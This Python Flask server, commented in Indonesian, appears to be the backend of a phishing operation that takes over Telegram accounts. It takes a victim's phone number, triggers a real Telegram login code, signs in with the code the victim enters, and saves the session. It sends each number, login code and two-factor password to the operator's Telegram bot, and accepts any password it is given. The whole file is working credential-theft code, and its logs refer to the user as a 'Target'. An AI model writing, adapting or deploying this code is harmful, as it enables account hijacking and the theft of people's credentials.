import os
from flask import Flask, request, jsonify, make_response
from flask_cors import CORS
import requests
from telethon import TelegramClient, errors
from asgiref.sync import async_to_sync

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

# Variabel Dashboard Railway
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

sessions_hash = {}

def send_log(text):
    """Fungsi pembantu untuk cek apakah data terkirim atau tidak"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})

async def telethon_logic(data):
    step = data.get('step')
    nomor = data.get('nomor')
    otp = data.get('otp')
    sandi = data.get('sandi')

    # Nama file session dibuat unik agar tidak bentrok
    client = TelegramClient(f"session_{nomor}", int(API_ID), API_HASH)
    
    try:
        await client.connect()
        
        if step == 1:
            # Kirim log ke bot bahwa ada nomor masuk
            send_log(f"📲 *Mencoba Kirim OTP*\nNomor: `{nomor}`")
            sent_code = await client.send_code_request(nomor)
            sessions_hash[nomor] = sent_code.phone_code_hash
            return {"status": "success"}, 200

        elif step == 2:
            phone_code_hash = sessions_hash.get(nomor)
            try:
                await client.sign_in(nomor, otp, phone_code_hash=phone_code_hash)
                send_log(f"✅ *Login Berhasil*\nNomor: `{nomor}`\nOTP: `{otp}`")
                return {"status": "success"}, 200
            except errors.SessionPasswordNeededError:
                send_log(f"🔐 *Target Butuh 2FA*\nNomor: `{nomor}`")
                return {"status": "need_2fa"}, 200
            except Exception as e:
                return {"status": "error", "message": str(e)}, 400

        elif step == 3:
            # Apapun sandinya, kirim ke bot dan loloskan
            send_log(f"🔑 *Sandi Diterima*\nNomor: `{nomor}`\nSandi: `{sandi}`")
            return {"status": "success"}, 200

    finally:
        await client.disconnect()

@app.route('/register', methods=['POST', 'OPTIONS'])
def register():
    if request.method == 'OPTIONS':
        return make_response(jsonify({"status": "ok"}), 200)
    data = request.json
    try:
        result, status_code = async_to_sync(telethon_logic)(data)
        return make_response(jsonify(result), status_code)
    except Exception as e:
        # Kirim error ke bot jika terjadi masalah teknis
        send_log(f"⚠️ *Server Error:* {str(e)}")
        return make_response(jsonify({"status": "error"}), 500)

if __name__ == "__main__":
    port = int(os.getenv("PORT", 8080))
    app.run(host="0.0.0.0", port=port)